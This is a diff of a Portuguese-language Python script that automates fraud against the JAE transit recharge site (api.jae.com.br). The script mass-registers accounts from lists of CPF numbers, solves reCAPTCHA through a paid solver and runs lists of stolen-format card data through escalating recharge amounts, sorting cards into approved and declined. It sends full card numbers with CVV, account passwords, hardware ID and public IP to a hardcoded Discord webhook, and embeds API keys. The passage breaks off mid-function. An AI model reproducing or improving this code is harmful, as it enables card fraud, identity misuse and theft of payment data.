@@ -6,19 +6,52 @@ import random
 import jwt
 import re
 import os
-import subprocess
-import platform
+import uuid
+import configparser
+from datetime import datetime
 from colorama import Fore, Back, Style, init
 
 # Inicializar colorama
 init(autoreset=True)
 
-# Configurações do Discord Webhook
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1400541032566755489/QUwnOqF4Hio7gI2Hca9VJB7vmtukPD7ktvAxQvTVvUF3nXZp3SJRyiKDlWKHaXWVfnB3"
+# Carregar credenciais de config.ini
+CONFIG_FILE = "config.ini"
 
-CAPMONSTER_API_KEY = "205ddff8d23fbaeabe193dc088c6123b"
+def carregar_config():
+    config = configparser.ConfigParser()
+    if not os.path.exists(CONFIG_FILE):
+        print(f"❌ Arquivo {CONFIG_FILE} não encontrado! Crie-o com a seção [credenciais].")
+        return None
+    try:
+        config.read(CONFIG_FILE, encoding="utf-8")
+    except Exception:
+        config.read(CONFIG_FILE)
+    if not config.has_section("credenciais"):
+        print("❌ Seção [credenciais] ausente no config.ini.")
+        return None
+    email = config.get("credenciais", "email", fallback="").strip()
+    senha = config.get("credenciais", "senha", fallback="").strip()
+    if not email or not senha:
+        print("❌ 'email' ou 'senha' não definidos em [credenciais].")
+        return None
+    return {"email": email, "senha": senha}
+
+CONFIG = carregar_config()
+if CONFIG is None:
+    raise SystemExit(1)
+
+EMAIL_CONFIG = CONFIG["email"]
+SENHA_CONFIG = CONFIG["senha"]
+
+CAPMONSTER_API_KEY = "ba7686da6365e8bab23fc3d33659ad7d"
 SITE_KEY = "6Lf8peEcAAAAAB0jNcCqVehfApzIVbZOG2s8yfub"
 WEBSITE_URL = "https://api.jae.com.br"
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1400541032566755489/QUwnOqF4Hio7gI2Hca9VJB7vmtukPD7ktvAxQvTVvUF3nXZp3SJRyiKDlWKHaXWVfnB3"
+
+# Timeouts e limites para evitar travamentos
+REQUEST_TIMEOUT = 30  # segundos para chamadas HTTP
+CAPTCHA_POLL_MAX = 30  # número máximo de tentativas ao buscar solução do captcha
+CAPTCHA_POLL_INTERVAL = 0.7  # intervalo entre tentativas em segundos
 
 # Função para fazer autenticação e obter token JWT
 def obter_token_jwt(cpf, senha):
@@ -37,7 +70,7 @@ def obter_token_jwt(cpf, senha):
     }
     
     try:
-        response = requests.post(url, headers=headers, data=json.dumps(payload))
+        response = requests.post(url, headers=headers, data=json.dumps(payload), timeout=REQUEST_TIMEOUT)
         
         if response.status_code == 200:
             data = response.json()
@@ -75,135 +108,6 @@ def imagem_para_base64(caminho_imagem):
 # Gerando o base64 da imagem automaticamente
 base64 = imagem_para_base64('6KKf5xRd.jpeg')
 
-def obter_hwid():
-    """
-    Obtém o HWID (Hardware ID) da máquina
-    """
-    try:
-        if platform.system() == "Windows":
-            # Usa wmic para obter o UUID da placa-mãe
-            result = subprocess.run(['wmic', 'csproduct', 'get', 'uuid'], 
-                                  capture_output=True, text=True, shell=True)
-            if result.returncode == 0:
-                lines = result.stdout.strip().split('\n')
-                for line in lines:
-                    line = line.strip()
-                    if line and line != 'UUID':
-                        return line
-            
-            # Fallback: usar serial number do sistema
-            result = subprocess.run(['wmic', 'bios', 'get', 'serialnumber'], 
-                                  capture_output=True, text=True, shell=True)
-            if result.returncode == 0:
-                lines = result.stdout.strip().split('\n')
-                for line in lines:
-                    line = line.strip()
-                    if line and line != 'SerialNumber':
-                        return line
-        else:
-            # Para sistemas Linux/Mac, usar machine-id ou hostname
-            try:
-                with open('/etc/machine-id', 'r') as f:
-                    return f.read().strip()
-            except:
-                return platform.node()
-        
-        # Fallback final
-        return platform.node()
-    except Exception as e:
-        return "HWID_UNKNOWN"
-
-def obter_ip_publico():
-    """
-    Obtém o IP público da máquina usando a API ipify
-    """
-    try:
-        response = requests.get("https://api.ipify.org/?format=json", timeout=10)
-        if response.status_code == 200:
-            data = response.json()
-            return data.get("ip", "IP_UNKNOWN")
-        else:
-            return "IP_UNKNOWN"
-    except Exception as e:
-        return "IP_UNKNOWN"
-
-def enviar_para_discord(dados_cartao, conta, valor_aprovado):
-    """
-    Envia dados da recarga bem-sucedida para o Discord webhook
-    """
-    try:
-        hwid = obter_hwid()
-        ip_publico = obter_ip_publico()
-        
-        # Criar embed para Discord
-        embed = {
-            "title": "Recarga Aprovada",
-            "color": 0x00ff00,  # Verde
-            "fields": [
-                {
-                    "name": "Cartão",
-                    "value": f"```{dados_cartao['numero']}|{dados_cartao['mes']}|{dados_cartao['ano']}|{dados_cartao['cvv']}```",
-                    "inline": False
-                },
-                {
-                    "name": "Conta",
-                    "value": f"**CPF:** {conta['cpf']}\n**Nome:** {conta['nome']}\n**Usuario:** {conta.get('usuario', 'N/A')}\n**Senha:** {conta.get('senha', 'N/A')}",
-                    "inline": True
-                },
-                {
-                    "name": "Valor",
-                    "value": f"R$ {valor_aprovado}",
-                    "inline": True
-                },
-                {
-                    "name": "HWID",
-                    "value": f"```{hwid}```",
-                    "inline": False
-                },
-                {
-                    "name": "IP Público",
-                    "value": f"```{ip_publico}```",
-                    "inline": True
-                }
-            ],
-            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
-            "footer": {
-                "text": "Sistema de Recargas JAE"
-            }
-        }
-        
-        payload = {
-            "embeds": [embed]
-        }
-        
-        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
-        
-        if response.status_code == 204:
-            print(f"{Fore.GREEN}✅ Dados enviados para Discord com sucesso{Style.RESET_ALL}")
-        else:
-            print(f"{Fore.YELLOW}⚠️ Erro ao enviar para Discord: {response.status_code}{Style.RESET_ALL}")
-            
-    except Exception as e:
-        print(f"{Fore.RED}❌ Erro ao enviar para Discord: {e}{Style.RESET_ALL}")
-
-def salvar_conta_recarregada(dados_cartao, conta, valor_aprovado):
-    """
-    Salva conta recarregada no arquivo recarregadas.txt e envia para Discord
-    Formato: CPF:senha:nome:valor
-    """
-    try:
-        # Salvar no arquivo recarregadas.txt no formato CPF:senha:nome:valor
-        with open("recarregadas.txt", "a", encoding="utf-8") as arquivo:
-            linha = f"{conta['cpf']}:{conta['senha']}:{conta['nome']}:{valor_aprovado}\n"
-            arquivo.write(linha)
-        print(f"{Fore.GREEN}✅ Conta recarregada salva em recarregadas.txt{Style.RESET_ALL}")
-        
-        # Enviar para Discord
-        enviar_para_discord(dados_cartao, conta, valor_aprovado)
-        
-    except Exception as e:
-        print(f"{Fore.RED}❌ Erro ao salvar conta recarregada: {e}{Style.RESET_ALL}")
-
 def salvar_conta_criada(cpf, senha, nome, email="", telefone="", codigo_cliente=""):
     """
     Salva uma conta criada com sucesso no arquivo contas.txt
@@ -221,40 +125,6 @@ def salvar_conta_criada(cpf, senha, nome, email="", telefone="", codigo_cliente=
         print(f"❌ Erro ao salvar conta: {e}")
         return False
 
-def ler_todos_dados_pagamento(arquivo_pagamento="pagamento.txt"):
-    """
-    Lê TODOS os dados de cartão do arquivo pagamento.txt
-    Formato esperado: numero|mes|ano|cvv
-    Retorna uma lista com todos os cartões
-    """
-    if not os.path.exists(arquivo_pagamento):
-        print(f"❌ Arquivo {arquivo_pagamento} não encontrado!")
-        return []
-    
-    cartoes = []
-    try:
-        with open(arquivo_pagamento, 'r', encoding='utf-8') as arquivo:
-            for linha in arquivo:
-                linha = linha.strip()
-                if linha and not linha.startswith('#'):
-                    partes = linha.split('|')
-                    if len(partes) >= 4:
-                        cartoes.append({
-                            "numero": partes[0].strip(),
-                            "mes": partes[1].strip(),
-                            "ano": partes[2].strip(),
-                            "cvv": partes[3].strip()
-                        })
-                    else:
-                        print(f"❌ Formato inválido na linha: {linha}. Use: numero|mes|ano|cvv")
-        
-        print(f"✅ {len(cartoes)} cartões carregados do arquivo {arquivo_pagamento}")
-        return cartoes
-        
-    except Exception as e:
-        print(f"❌ Erro ao ler arquivo {arquivo_pagamento}: {e}")
-        return []
-
 def ler_dados_pagamento(arquivo_pagamento="pagamento.txt"):
     """
     Lê dados de cartão do arquivo pagamento.txt
@@ -264,6 +134,37 @@ def ler_dados_pagamento(arquivo_pagamento="pagamento.txt"):
     if not os.path.exists(arquivo_pagamento):
         print(f"❌ Arquivo {arquivo_pagamento} não encontrado!")
         return None
+
+def ler_lista_cartoes(arquivo_pagamento="pagamento.txt"):
+    """
+    Lê múltiplos cartões do arquivo pagamento.txt
+    Formato esperado por linha: numero|mes|ano|cvv
+    Retorna uma lista de dicionários com os dados dos cartões
+    """
+    cartoes = []
+    if not os.path.exists(arquivo_pagamento):
+        print(f"❌ Arquivo {arquivo_pagamento} não encontrado!")
+        return cartoes
+    try:
+        with open(arquivo_pagamento, 'r', encoding='utf-8') as arquivo:
+            for linha in arquivo:
+                linha = linha.strip()
+                if not linha:
+                    continue
+                partes = linha.split('|')
+                if len(partes) >= 4:
+                    cartoes.append({
+                        "numero": partes[0].strip(),
+                        "mes": partes[1].strip(),
+                        "ano": partes[2].strip(),
+                        "cvv": partes[3].strip()
+                    })
+                else:
+                    print(f"⚠️ Linha inválida em {arquivo_pagamento}: {linha}")
+        print(f"✅ Carregados {len(cartoes)} cartões de {arquivo_pagamento}")
+    except Exception as e:
+        print(f"❌ Erro ao ler cartões de {arquivo_pagamento}: {e}")
+    return cartoes
     
     try:
         with open(arquivo_pagamento, 'r', encoding='utf-8') as arquivo:
@@ -465,7 +366,7 @@ def resolver_captcha():
         }
     }
     
-    response = requests.post(capmonster_url, json=task_payload)
+    response = requests.post(capmonster_url, json=task_payload, timeout=REQUEST_TIMEOUT)
     task_data = response.json()
     
     if task_data.get("errorId") != 0:
@@ -477,15 +378,15 @@ def resolver_captcha():
     result_url = "https://api.capmonster.cloud/getTaskResult"
     result_payload = {"clientKey": CAPMONSTER_API_KEY, "taskId": task_id}
     
-    for i in range(40):
-        time.sleep(1)
-        result_response = requests.post(result_url, json=result_payload)
+    for i in range(CAPTCHA_POLL_MAX):
+        time.sleep(CAPTCHA_POLL_INTERVAL)
+        result_response = requests.post(result_url, json=result_payload, timeout=REQUEST_TIMEOUT)
         result_data = result_response.json()
         
         if result_data.get("status") == "ready":
             return result_data["solution"]["gRecaptchaResponse"]
         
-        print(f"Aguardando resolução... ({i+1}/30)")
+        print(f"Aguardando resolução... ({i+1}/{CAPTCHA_POLL_MAX})")
     
     print("Tempo limite excedido para resolver captcha")
     return None
@@ -516,9 +417,9 @@ def fazer_cadastro(token_captcha, nome=None, cpf=None, data_nascimento=None):
         "numeroDocumentoAlternativo": "",
         "dataNascimento": data_nascimento,
         "celular": "13988238323",
-        "email": "arthurpacheco1225@gmail.com",
-        "senha": "Jae1234!",
-        "confirmacaoSenha": "Jae1234!",
+        "email": EMAIL_CONFIG,
+        "senha": SENHA_CONFIG,
+        "confirmacaoSenha": SENHA_CONFIG,
         "sexo": None,
         "logradouro": None,
         "numero": None,
@@ -535,7 +436,7 @@ def fazer_cadastro(token_captcha, nome=None, cpf=None, data_nascimento=None):
         "codigoVerificacao": ""
     }
 
-    response = requests.post(url, headers=headers, data=json.dumps(payload))
+    response = requests.post(url, headers=headers, data=json.dumps(payload), timeout=REQUEST_TIMEOUT)
     
     print("Status Code:", response.status_code)
     print("Response Body:", response.text)
@@ -601,10 +502,10 @@ def processar_cadastros_lista_simples(caminho_arquivo="lista.txt", limite=None):
             print(f"ID Cliente: {cadastro_data.get('idCliente')}")
             
             # Salvar conta criada com sucesso
-            email_fixo = "naoachanuncatropadossocios@tuamaeaquelaursa.com"
+            email_fixo = EMAIL_CONFIG
             salvar_conta_criada(
                 cpf_usado, 
-                "J@102030", 
+                SENHA_CONFIG, 
                 nome_usado, 
                 email_fixo, 
                 "13988238323", 
@@ -687,23 +588,23 @@ def processar_cadastros_lista(caminho_arquivo="lista.txt", limite=None):
             cadastro_data = response.json()
             print(f"Código: {cadastro_data.get('codigo')}")
             print(f"ID Cliente: {cadastro_data.get('idCliente')}")
-            
+
             # Salvar conta criada com sucesso
-            email_fixo = "naoachanuncatropadossocios@tuamaeaquelaursa.com"
+            email_fixo = EMAIL_CONFIG
             salvar_conta_criada(
-                cpf_usado, 
-                "letlet@1A", 
-                nome_usado, 
-                email_fixo, 
-                "13988238323", 
+                cpf_usado,
+                SENHA_CONFIG,
+                nome_usado,
+                email_fixo,
+                "13988238323",
                 str(cadastro_data.get('codigo', ''))
             )
-            
+
             sucessos += 1
-            
+
             # Fazer autenticação e obter token do cartão
             print("Obtendo token JWT...")
-            token_jwt = obter_token_jwt(cpf_usado, "letlet@1A")
+            token_jwt = obter_token_jwt(cpf_usado, SENHA_CONFIG)
             if token_jwt:
                 print("✅ Token JWT obtido!")
                 
@@ -759,7 +660,7 @@ def processar_cadastros_lista(caminho_arquivo="lista.txt", limite=None):
                                 {
                                     'codigo': cadastro_data.get('codigo'),
                                     'nome': nome_usado,
-                                    'email': "naoachanuncatropadossocios@tuamaeaquelaursa.com",
+                                    'email': EMAIL_CONFIG,
                                     'cpf': cpf_usado,
                                     'telefone': "13988238323"
                                 }
@@ -810,7 +711,7 @@ def verificar_pedidos_em_aberto(jwt_token, codigo_cliente, id_produto=6):
     }
     
     try:
-        response = requests.get(url, headers=headers)
+        response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
         print(f"Status Code verificar_pedidos_em_aberto: {response.status_code}")
         
         if response.status_code == 200:
@@ -855,7 +756,7 @@ def obter_token_cartao(jwt_token, codigo_cliente, numero_cartao="539090913329629
     print(f"Payload sendo enviado: {json.dumps(payload, indent=2)}")
     
     try:
-        response = requests.post(url, headers=headers, data=json.dumps(payload))
+        response = requests.post(url, headers=headers, data=json.dumps(payload), timeout=REQUEST_TIMEOUT)
         
         print(f"Status Code: {response.status_code}")
         print(f"Response Body: {response.text}")
@@ -926,7 +827,7 @@ def criar_pedido(jwt_token, codigo_cliente, valor_pedido=147.0):
     print(f"Payload do pedido: {json.dumps(payload, indent=2)}")
     
     try:
-        response = requests.post(url, headers=headers, data=json.dumps(payload))
+        response = requests.post(url, headers=headers, data=json.dumps(payload), timeout=REQUEST_TIMEOUT)
         
         print(f"Status Code: {response.status_code}")
         print(f"Response Body: {response.text}")
@@ -1039,7 +940,7 @@ def processar_pagamento_cartao(jwt_token, order_id, amount, token_cartao, custom
     print(f"Payload do pagamento: {json.dumps(payload, indent=2)}")
     
     try:
-        response = requests.post(url, headers=headers, data=json.dumps(payload))
+        response = requests.post(url, headers=headers, data=json.dumps(payload), timeout=REQUEST_TIMEOUT)
         
         print(f"Status Code: {response.status_code}")
         print(f"Response Body: {response.text}")
@@ -1105,7 +1006,7 @@ def obter_conta_acesso(jwt_token, jti):
     
     try:
         print(f"Obtendo conta-acesso para JTI: {jti}")
-        response = requests.get(url, headers=headers)
+        response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
         
         print(f"Status Code: {response.status_code}")
         print(f"Response Body: {response.text}")
@@ -1161,47 +1062,6 @@ def atualizar_device(jwt_token, codigo_cliente, token_device="fHp9MNfuT_iG7Or0LL
         print(f"Erro ao atualizar device: {e}")
         return None
 
-def salvar_conta_futura(conta):
-    """
-    Salva conta que falhou em todos os valores na fila de futuros
-    """
-    try:
-        with open("futuros.txt", "a", encoding="utf-8") as arquivo:
-            linha = f"{conta['cpf']}|{conta.get('senha', '')}|{conta['nome']}|{conta.get('email', '')}|{conta.get('telefone', '')}|{conta.get('codigo_cliente', '')}\n"
-            arquivo.write(linha)
-        print(f"{Fore.YELLOW}⏳ Conta salva em futuros.txt para tentativa posterior{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"{Fore.RED}❌ Erro ao salvar conta futura: {e}{Style.RESET_ALL}")
-
-def remover_cartao_pagamento(numero_cartao, arquivo_pagamento="pagamento.txt"):
-    """
-    Remove cartão específico do arquivo pagamento.txt
-    """
-    try:
-        # Ler todas as linhas do arquivo
-        with open(arquivo_pagamento, "r", encoding="utf-8") as arquivo:
-            linhas = arquivo.readlines()
-        
-        # Filtrar linhas que não contêm o cartão a ser removido
-        linhas_filtradas = []
-        for linha in linhas:
-            linha = linha.strip()
-            if linha and not linha.startswith('#'):
-                partes = linha.split('|')
-                if len(partes) >= 4:
-                    numero_na_linha = partes[0].strip()
-                    if numero_na_linha != numero_cartao:
-                        linhas_filtradas.append(linha + '\n')
-        
-        # Reescrever o arquivo sem o cartão removido
-        with open(arquivo_pagamento, "w", encoding="utf-8") as arquivo:
-            arquivo.writelines(linhas_filtradas)
-        
-        print(f"{Fore.RED}🗑️ Cartão {numero_cartao} removido de {arquivo_pagamento}{Style.RESET_ALL}")
-        
-    except Exception as e:
-        print(f"{Fore.RED}❌ Erro ao remover cartão: {e}{Style.RESET_ALL}")
-
 def salvar_cartao_aprovado(dados_cartao, conta, valor_aprovado):
     """
     Salva cartão aprovado no arquivo aprovados.txt
@@ -1225,6 +1085,171 @@ def salvar_cartao_recusado(dados_cartao, conta, motivo="DECLINED"):
         print(f"{Fore.RED}❌ Cartão salvo em recusados.txt{Style.RESET_ALL}")
     except Exception as e:
         print(f"{Fore.RED}❌ Erro ao salvar cartão recusado: {e}{Style.RESET_ALL}")
+
+def remover_cartao_de_pagamento(dados_cartao, arquivo_pagamento="pagamento.txt"):
+    """
+    Remove um cartão específico do arquivo pagamento.txt com base em numero|mes|ano|cvv
+    """
+    try:
+        if not os.path.exists(arquivo_pagamento):
+            print(f"⚠️ Arquivo {arquivo_pagamento} não encontrado para remoção de cartão")
+            return False
+        with open(arquivo_pagamento, 'r', encoding='utf-8') as f:
+            linhas = f.readlines()
+        alvo = f"{dados_cartao['numero']}|{dados_cartao['mes']}|{dados_cartao['ano']}|{dados_cartao['cvv']}".strip()
+        novas = []
+        removido = False
+        for linha in linhas:
+            linha_strip = linha.strip()
+            if not linha_strip:
+                novas.append(linha)
+                continue
+            if linha_strip.split('|')[:4] == alvo.split('|'):
+                removido = True
+                continue
+            novas.append(linha)
+        if removido:
+            with open(arquivo_pagamento, 'w', encoding='utf-8') as f:
+                f.writelines(novas)
+            print(f"{Fore.GREEN}🗑️ Cartão removido de {arquivo_pagamento}{Style.RESET_ALL}")
+            return True
+        else:
+            print(f"{Fore.YELLOW}⚠️ Cartão não encontrado em {arquivo_pagamento}{Style.RESET_ALL}")
+            return False
+    except Exception as e:
+        print(f"{Fore.RED}❌ Erro ao remover cartão de {arquivo_pagamento}: {e}{Style.RESET_ALL}")
+        return False
+
+def salvar_conta_recarregada(conta, valor_aprovado, arquivo_recarregadas="recarregadas.txt"):
+    """
+    Salva a conta recarregada em recarregadas.txt no formato cpf|senha|valor
+    """
+    try:
+        with open(arquivo_recarregadas, "a", encoding="utf-8") as f:
+            linha = f"{conta.get('cpf','')}|{conta.get('senha','')}|{valor_aprovado:.2f}\n"
+            f.write(linha)
+        print(f"{Fore.GREEN}✅ Conta salva em {arquivo_recarregadas}{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"{Fore.RED}❌ Erro ao salvar recarregada: {e}{Style.RESET_ALL}")
+
+def remover_conta_de_contas(conta, arquivo_contas="contas.txt"):
+    """
+    Remove a linha correspondente à conta (cpf|senha|...) de contas.txt
+    Tenta casar por CPF e senha para maior precisão.
+    """
+    try:
+        if not os.path.exists(arquivo_contas):
+            print(f"⚠️ Arquivo {arquivo_contas} não encontrado para remoção")
+            return False
+        with open(arquivo_contas, 'r', encoding='utf-8') as f:
+            linhas = f.readlines()
+        novas = []
+        removida = False
+        cpf_alvo = str(conta.get('cpf','')).strip()
+        senha_alvo = str(conta.get('senha','')).strip()
+        for linha in linhas:
+            bruto = linha.rstrip('\n')
+            partes = [p.strip() for p in bruto.split('|')]
+            # Match por CPF e senha quando possível
+            match_por_campos = (len(partes) >= 2 and partes[0] == cpf_alvo and partes[1] == senha_alvo)
+            # Fallback: se alguma parte casa CPF e outra casa senha
+            fallback_match = (cpf_alvo in partes and senha_alvo in partes)
+            if match_por_campos or fallback_match:
+                removida = True
+                continue
+            novas.append(linha)
+        if removida:
+            with open(arquivo_contas, 'w', encoding='utf-8') as f:
+                f.writelines(novas)
+            print(f"{Fore.GREEN}🗑️ Conta {cpf_alvo} removida de {arquivo_contas}{Style.RESET_ALL}")
+            return True
+        else:
+            print(f"{Fore.YELLOW}⚠️ Conta {cpf_alvo} não encontrada em {arquivo_contas}{Style.RESET_ALL}")
+            return False
+    except Exception as e:
+        print(f"{Fore.RED}❌ Erro ao remover conta de {arquivo_contas}: {e}{Style.RESET_ALL}")
+        return False
+
+def obter_ip_publico():
+    """Obtém o IP público atual do dispositivo."""
+    try:
+        r = requests.get("https://api.ipify.org?format=json", timeout=7)
+        if r.status_code == 200:
+            return r.json().get("ip", "N/A")
+        return "N/A"
+    except Exception:
+        return "N/A"
+
+def obter_hwid():
+    """Obtém um identificador de hardware (HWID) do Windows, com fallback para MAC."""
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
+        val, _ = winreg.QueryValueEx(key, "MachineGuid")
+        return val
+    except Exception:
+        try:
+            return hex(uuid.getnode())
+        except Exception:
+            return "N/A"
+
+def enviar_webhook_recarga_aprovada(webhook_url, dados_cartao, conta, valor_aprovado, hwid=None, ip_publico=None):
+    """
+    Envia uma notificação para Discord quando a recarga é aprovada (formato embed).
+    """
+    try:
+        if not ip_publico:
+            ip_publico = obter_ip_publico()
+        if not hwid:
+            hwid = obter_hwid()
+        hora = datetime.now().strftime("%H:%M")
+        embed = {
+            "title": "✅ Recarga Aprovada",
+            "description": "Detalhes da operação",
+            "color": 3066993,
+            "fields": [
+                {
+                    "name": "Cartão",
+                    "value": f"{dados_cartao['numero']}|{dados_cartao['mes']}|{dados_cartao['ano']}|{dados_cartao['cvv']}",
+                    "inline": False
+                },
+                {
+                    "name": "Conta",
+                    "value": (
+                        f"CPF: {conta.get('cpf','')}\n"
+                        f"Nome: {conta.get('nome','')}\n"
+                        f"Usuario: N/A\n"
+                        f"Senha: {conta.get('senha','')}"
+                    ),
+                    "inline": False
+                },
+                {
+                    "name": "Valor",
+                    "value": f"R$ {valor_aprovado:.2f}",
+                    "inline": True
+                },
+                {
+                    "name": "HWID",
+                    "value": f"{hwid}",
+                    "inline": False
+                },
+                {
+                    "name": "IP Público",
+                    "value": f"{ip_publico}",
+                    "inline": True
+                }
+            ],
+            "footer": {"text": f"Sistema de Recargas JAE • Hoje às {hora}"},
+            "timestamp": datetime.utcnow().isoformat() + "Z"
+        }
+        payload = {"username": "Sistema de Recargas JAE", "embeds": [embed]}
+        resp = requests.post(webhook_url, json=payload, timeout=10)
+        if resp.status_code in (200, 204):
+            print(f"{Fore.GREEN}📣 Webhook enviado com sucesso{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.YELLOW}⚠️ Falha ao enviar webhook: {resp.status_code} - {resp.text}{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"{Fore.RED}❌ Erro ao enviar webhook: {e}{Style.RESET_ALL}")
 
 def tentar_pagamento_escalonado(jwt_token, codigo_cliente, token_cartao, customer_data, card_data, dados_cartao, conta):
     """
@@ -1268,7 +1293,6 @@ def tentar_pagamento_escalonado(jwt_token, codigo_cliente, token_cartao, custome
             if status_pagamento == "APROVADO":
                 print(f"{Fore.GREEN}✅ PAGAMENTO APROVADO com R$ {valor:.2f}!{Style.RESET_ALL}")
                 salvar_cartao_aprovado(dados_cartao, conta, valor)
-                salvar_conta_recarregada(dados_cartao, conta, valor)
                 return True, valor
             elif status_pagamento == "REJEITADO":
                 # Verificar se é saldo insuficiente
@@ -1289,14 +1313,6 @@ def tentar_pagamento_escalonado(jwt_token, codigo_cliente, token_cartao, custome
     
     # Se chegou aqui, nenhum valor funcionou
     print(f"{Fore.RED}❌ Nenhum valor funcionou para este cartão{Style.RESET_ALL}")
-    
-    # Salvar conta na fila de futuros
-    salvar_conta_futura(conta)
-    
-    # Remover cartão do arquivo pagamento.txt
-    remover_cartao_pagamento(dados_cartao['numero'])
-    
-    # Salvar cartão como recusado
     salvar_cartao_recusado(dados_cartao, conta, "TODOS_VALORES_FALHARAM")
     return False, 0
 
@@ -1304,7 +1320,6 @@ def efetuar_recarga_contas(limite=None):
     """
     Função para efetuar recarga nas contas salvas em contas.txt
     Lê os dados de pagamento do arquivo pagamento.txt
-    Lógica: Para cada cartão, tenta com todas as contas até falhar 3 valores, então pula para próximo cartão
     """
     print(f"{Fore.CYAN}=== INICIANDO PROCESSO DE RECARGA ==={Style.RESET_ALL}")
     
@@ -1314,156 +1329,165 @@ def efetuar_recarga_contas(limite=None):
         print(f"{Fore.RED}❌ Nenhuma conta encontrada em contas.txt{Style.RESET_ALL}")
         return
     
-    # Ler TODOS os cartões de pagamento
-    todos_cartoes = ler_todos_dados_pagamento()
-    if not todos_cartoes:
+    # Ler lista de cartões
+    lista_cartoes = ler_lista_cartoes()
+    if not lista_cartoes:
         print(f"{Fore.RED}❌ Nenhum cartão encontrado em pagamento.txt{Style.RESET_ALL}")
         return
     
     print(f"{Fore.GREEN}📋 Encontradas {len(contas)} contas para recarga{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}💳 Encontrados {len(todos_cartoes)} cartões para processamento{Style.RESET_ALL}")
     
     # Aplicar limite se especificado
     if limite and limite < len(contas):
         contas = contas[:limite]
         print(f"{Fore.YELLOW}🔢 Limitando processamento a {limite} contas{Style.RESET_ALL}")
     
-    sucessos_total = 0
-    falhas_total = 0
+    print(f"{Fore.BLUE}💳 Cartões carregados: {len(lista_cartoes)}{Style.RESET_ALL}")
+    ip_publico = obter_ip_publico()
+    hwid = obter_hwid()
     
-    # LOOP PRINCIPAL: Para cada cartão
-    for idx_cartao, dados_cartao in enumerate(todos_cartoes, 1):
-        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA}🎯 PROCESSANDO CARTÃO {idx_cartao}/{len(todos_cartoes)}: ****{dados_cartao['numero'][-4:]}{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
+    sucessos = 0
+    falhas = 0
+    
+    for i, conta in enumerate(contas, 1):
+        print(f"\n{Fore.YELLOW}--- PROCESSANDO CONTA {i}/{len(contas)} ---{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}CPF: {conta['cpf']}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}Nome: {conta['nome']}{Style.RESET_ALL}")
         
-        sucessos_cartao = 0
+        # Fazer login
+        print(f"{Fore.BLUE}Fazendo login...{Style.RESET_ALL}")
+        # Usar sempre a senha do config.ini para login
+        token_jwt = obter_token_jwt(conta['cpf'], SENHA_CONFIG)
+        if not token_jwt:
+            print(f"{Fore.RED}❌ Falha no login{Style.RESET_ALL}")
+            falhas += 1
+            continue
         
-        # Para cada conta, tentar com o cartão atual
-        for i, conta in enumerate(contas, 1):
-            print(f"\n{Fore.YELLOW}--- CONTA {i}/{len(contas)} COM CARTÃO ****{dados_cartao['numero'][-4:]} ---{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}CPF: {conta['cpf']}{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}Nome: {conta['nome']}{Style.RESET_ALL}")
-            
-            # Fazer login
-            print(f"{Fore.BLUE}Fazendo login...{Style.RESET_ALL}")
-            token_jwt = obter_token_jwt(conta['cpf'], conta['senha'])
-            if not token_jwt:
-                print(f"{Fore.RED}❌ Falha no login{Style.RESET_ALL}")
-                falhas_total += 1
-                continue
-            
-            print(f"{Fore.GREEN}✅ Login realizado com sucesso!{Style.RESET_ALL}")
-            
-            # Usar código do cliente salvo ou extrair do token
-            codigo_cliente = conta.get('codigo_cliente')
-            if not codigo_cliente:
-                # Tentar extrair do token se não tiver salvo
-                decoded = decodificar_token_jwt(token_jwt)
-                if decoded:
-                    codigo_cliente = decoded.get('codigo')
-            
-            if not codigo_cliente:
-                print(f"{Fore.RED}❌ Código do cliente não encontrado{Style.RESET_ALL}")
-                falhas_total += 1
-                continue
-            
-            # Verificar pedidos em aberto
-            print(f"{Fore.BLUE}Verificando pedidos em aberto...{Style.RESET_ALL}")
-            pedidos_data = verificar_pedidos_em_aberto(token_jwt, codigo_cliente)
-            
-            # Se não há pedidos em aberto (404), vamos criar um novo pedido
-            if not pedidos_data:
-                print(f"{Fore.YELLOW}📝 Nenhum pedido em aberto encontrado, criando novo pedido...{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.GREEN}✅ Pedidos em aberto verificados!{Style.RESET_ALL}")
-            
+        print(f"{Fore.GREEN}✅ Login realizado com sucesso!{Style.RESET_ALL}")
+        
+        # Usar código do cliente salvo ou extrair do token
+        codigo_cliente = conta.get('codigo_cliente')
+        if not codigo_cliente:
+            # Tentar extrair do token se não tiver salvo
+            decoded = decodificar_token_jwt(token_jwt)
+            if decoded:
+                codigo_cliente = decoded.get('codigo')
+        
+        if not codigo_cliente:
+            print(f"{Fore.RED}❌ Código do cliente não encontrado{Style.RESET_ALL}")
+            falhas += 1
+            continue
+        
+        # Verificar pedidos em aberto
+        print(f"{Fore.BLUE}Verificando pedidos em aberto...{Style.RESET_ALL}")
+        pedidos_data = verificar_pedidos_em_aberto(token_jwt, codigo_cliente)
+        
+        # Se não há pedidos em aberto (404), vamos criar um novo pedido
+        if not pedidos_data:
+            print(f"{Fore.YELLOW}📝 Nenhum pedido em aberto encontrado, criando novo pedido...{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.GREEN}✅ Pedidos em aberto verificados!{Style.RESET_ALL}")
+        
+        # Tentar com cartões até aprovar ou esgotar
+        aprovado_com_algum_cartao = False
+        # Índice do cartão atual que está "live". Mantido fora do loop de contas.
+        if 'indice_cartao_live' not in locals():
+            indice_cartao_live = 0
+
+        # Se não houver mais cartões disponíveis, encerra o processo
